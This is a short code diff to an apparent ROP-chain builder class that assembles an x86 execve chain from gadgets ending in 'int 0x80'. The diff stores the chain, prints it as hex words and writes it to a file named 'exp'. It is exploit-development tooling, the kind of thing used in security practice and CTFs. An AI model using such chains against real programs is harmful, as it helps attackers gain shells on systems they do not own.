@@ -9,6 +9,7 @@ class ExecveBuilder():
         self.init_gadgets = {}
         self.gadget_finder = GadgetFinder()
         self.gadgets = {}
+        self.chain = b''
 
     def find_xor_src(self, stdout):
         instructions = []
@@ -115,7 +116,15 @@ class ExecveBuilder():
         for _ in range(0, 11): p += self.gadgets['inc eax'].compile()
         p += self.gadgets['int 0x80'].compile()
 
-        return p
+        self.chain = p
+
+        formatted_bytes = ' '.join([str(hex(int.from_bytes(self.chain[i:i+4], "little"))) for i in range(0, len(self.chain), 4)])
+        print(formatted_bytes)
+
+
+    def write_chain(self):
+        out_file = open('exp', 'wb')
+        out_file.write(self.chain)
 
 
 
